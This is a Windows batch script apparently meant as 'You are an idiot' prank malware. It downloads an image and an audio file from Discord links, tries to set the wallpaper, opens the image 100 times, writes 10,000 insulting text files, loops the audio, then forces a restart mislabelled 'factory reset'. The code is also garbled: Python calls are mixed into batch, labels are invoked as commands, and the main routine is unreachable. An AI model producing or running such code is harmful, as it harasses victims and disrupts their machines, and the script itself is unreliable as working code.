@echo off

:: Function to change wallpaper
:change_wallpaper
setlocal
set "SPI_SETDESKWALLPAPER=20"
set "image_path=%~1"
ctypes.windll.user32.SystemParametersInfoW %SPI_SETDESKWALLPAPER% 0 "%image_path%" 0
goto :eof

:: Function to download image
:download_image
setlocal
set "image_url=https://cdn.discordapp.com/attachments/1260051657966751755/1271959503000309780/latest.png?ex=66b93c19&is=66b7ea99&hm=543d49b57bb1b9c16cf2c073cd04642ef23e60639ad5576218f203b9f4cdf4fd"
set "temp_image=temp_image.jpg"
curl -o %temp_image% %image_url%
if %errorlevel% equ 0 ( echo %temp_image% ) else ( echo Failed to download image )
goto :eof

:: Function to download audio
:download_audio
setlocal
set "audio_url=https://cdn.discordapp.com/attachments/1260051657966751755/1271959359064379433/you-are-an-idiot.mp3?ex=66b93bf7&is=66b7ea77&hm=aeb6951b756684abd40c505c569a442dd7acebc4b04570503484609942e78a0a"
set "temp_audio=temp_audio.mp3"
curl -o %temp_audio% %audio_url%
if %errorlevel% equ 0 ( echo %temp_audio% ) else ( echo Failed to download audio )
goto :eof

:: Function to create text files
:create_text_files
setlocal
set "num_files=%~1"
for /l %%i in (1,1,%num_files%) do ( echo You are a idiot! > %%i.txt )
goto :eof

:: Function to play audio on loop
:play_audio_loop
setlocal
set "audio_path=%~1"
:loop
winsound.PlaySound "%audio_path%" /SND_FILENAME /SND_LOOP /SND_ASYNC
timeout /t 180 /nobreak >nul
goto loop

:: Function to factory reset
:factory_reset
shutdown /r /t 0

:: Main function
:main
:: Download and set wallpaper
for /f "delims=" %%i in ('download_image') do set "image_path=%%i"
if defined image_path ( call :change_wallpaper "%image_path%" )

:: Spam open image
for /l %%i in (1,1,100) do ( start "" "%image_path%" )

:: Create text files
call :create_text_files 10000

:: Download and play audio
for /f "delims=" %%i in ('download_audio') do set "audio_path=%%i"
if defined audio_path ( start /b "play_audio_loop" cmd /c "play_audio_loop "%audio_path%"" )

:: Wait 3 minutes and factory reset
timeout /t 180 /nobreak >nul
call :factory_reset

goto :eof

call :main